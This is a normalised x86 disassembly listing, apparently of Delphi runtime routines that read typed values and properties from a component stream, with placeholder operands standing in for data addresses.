lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_417f10
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c499
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c2ac
pop ecx
test al al
jne r-xdata
call sub_403aa0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a4c
sub_41c4bc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c537
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41de7c
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_40346c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c560
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c781
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41d80c
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41d80c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41c751
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41c70f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c1ac
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c224
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41c30c
pop ecx
push ebp
call sub_41c4bc
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41c41c
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403ad0
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c224
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41c224
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c788
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_40400c
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4051fc
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_40346c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4185ac
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c170
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4183f4
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c170
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4183f4
sub_41c714
push ebp
call sub_41c28c
pop ecx
test al al
je r-xdata
call sub_403a4c
call sub_403aa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403270
sub_41c79c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c80c
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41c7f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c80c
mov eax [ ebp - 0x4 ]
call sub_41bd5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bea0
retn
sub_41c80c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bc44
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41cd14
mov eax [ ebp - 0x4 ]
call sub_41cbb0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_40346c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41c8ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_40346c
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bc44
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41c560
mov eax [ ebp - 0x4 ]
call sub_41cbb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c8d5
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41c8dc
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41d9e8
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41cb64
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41bfac
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41c920
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41d9e8
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41cb64
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41bfac
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41c964
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41d9e8
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41cb64
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41bfac
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41c9b4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41d9e8
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41cb64
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41bfac
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41c9f8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41d9e8
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41ba84
mov al [ eax + lookup_table_41ca1f ]
jmp [ eax * 4 + jump_table_41ca2d ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41bfac
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_4040d8
mov eax esi
call j_sub_4044b4
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41bfac
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40403c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40403c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40403c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40403c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41caf8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41d9e8
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41bfac
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41bfac
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41bfac
jmp r-xdata
jmp r-xdata
call sub_41ba84
sub_41cb64
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41bf88
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41caf8
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41d9e8
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41bfac
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41cbb8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41bf88
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41d9e8
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41caf8
mov [ edi ] eax
sub_41cbf8
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41cce9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403fe8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404080
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ccf0
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031c0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40424c
sub_41cd14
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41cee4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403864#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41d80c
xor edx edx
push ebp
push j_sub_403864
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4042a8
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404508
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403498
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414750
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403498
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414750
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d098
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41bf98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41bf98
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_414844
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41ccf8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ceeb
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov edi ebx
jmp r-xdata
sub_41ceac
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403a4c
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403aa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ceeb
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
sub_41cef4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_417db8
mov ebx eax
test ebx ebx
je r-xdata
call sub_41ba84
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4148b8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41cf3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b518
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4183f4
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41cf7c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41cfcb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e100
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4150d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cfd2
lea eax [ ebp - 0x10 ]
call sub_40ec8c
retn
sub_41cfd8
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41d08a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41bf88
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c9f8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b518
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4183f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d9e8
lea eax [ ebp - 0x4 ]
call sub_4058a8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_415274
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d091
lea eax [ ebp - 0x8 ]
call sub_403fe8
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
sub_41d098
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d393
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d39a
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_40400c
lea eax [ ebp - 0x24 ]
call sub_4046c8
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40400c
retn
jmp [ eax * 4 + jump_table_41d128 ]
mov eax [ rw-data ]
call sub_41ba6c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414844
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bf88
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c048
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4148b8
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41c9f8
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_4146ec
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4148b8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c8dc
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e8c
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41d848
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414b8c
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41d904
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414ca0
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d72c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4148b8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bf88
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bf88
cmp al 0xd
jne r-xdata
push ebp
call sub_41cf7c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cb64
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4151b8
jmp r-xdata
push ebp
call sub_41cfd8
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414844
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41caf8
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4148b8
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c9f8
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41cef4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d9e8
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4148b8
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41c9f8
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d9e8
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415158
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d9e8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414844
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c0a0
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415158
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41c9f8
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41cf3c
pop ecx
jmp r-xdata
sub_41d3a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_40403c
jmp r-xdata
mov eax [ ebx ]
call sub_417f50
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408da8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d400
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d71b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d7e8
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41d6f9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d6ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41d80c
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41d80c
mov eax [ ebp - 0x1c ]
call sub_417aa8
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41d80c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
